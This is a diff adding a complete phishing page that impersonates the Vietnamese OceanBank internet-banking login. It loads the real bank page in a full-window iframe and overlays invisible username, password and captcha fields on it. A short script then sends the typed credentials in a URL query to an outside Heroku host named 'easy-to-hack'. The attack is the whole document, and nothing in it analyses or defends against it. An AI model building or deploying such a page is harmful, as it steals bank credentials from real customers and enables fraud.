@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OceanBank - Easy Internet Banking</title>
+</head>
+
+<style>
+    body {
+        box-sizing: border-box;
+    }
+
+    iframe {
+        height: calc(100vh - 20px) !important;
+        width: calc(100vw - 10px) !important;
+    }
+
+    div {
+        position: fixed;
+        top: 0;
+        bottom: 0;
+        left: 0;
+        right: 0;
+    }
+
+    #user {
+        outline: none;
+        width: 270px;
+        height: 16px;
+        padding: 6px 10px;
+        position: absolute;
+        top: 30.5%;
+        right: 14.3%;
+    }
+
+    #password {
+        outline: none;
+        width: 270px;
+        height: 16px;
+        padding: 6px 10px;
+        position: absolute;
+        top: 39.6%;
+        right: 14.3%;
+    }
+
+    #maxn {
+        outline: none;
+        width: 106px;
+        height: 16px;
+        padding: 6px 10px;
+        position: absolute;
+        top: 49%;
+        right: 26.3%;
+    }
+
+    button {
+        border: none;
+        outline: none;
+        background-color: #009ddc;
+        color: white;
+        cursor: pointer;
+        position: absolute;
+        top: 55.9%;
+        right: 25.6%;
+        padding: 8.1px 36.6px;
+    }
+</style>
+
+<body>
+    <iframe id='iframe' src="https://ib.oceanbank.vn/customer/home_pc.htm" frameborder="0"></iframe>
+    <div>
+        <form>
+            <input type="text" name="user" id="user">
+            <input type="password" name="password" id='password'>
+            <input type="text" id="maxn">
+            <button type="submit">Đăng nhập</button>
+        </form>
+    </div>
+</body>
+
+<script>
+    const form = document.querySelector('form')
+    const user = document.querySelector('#user')
+    const pass = document.querySelector('#password')
+    form.onsubmit = () => {
+        form.setAttribute('action', `https://easy-to-hack.herokuapp.com/oceanbank?${user.value}&${pass.value}`)
+
+    }
+</script>
+
+</html>
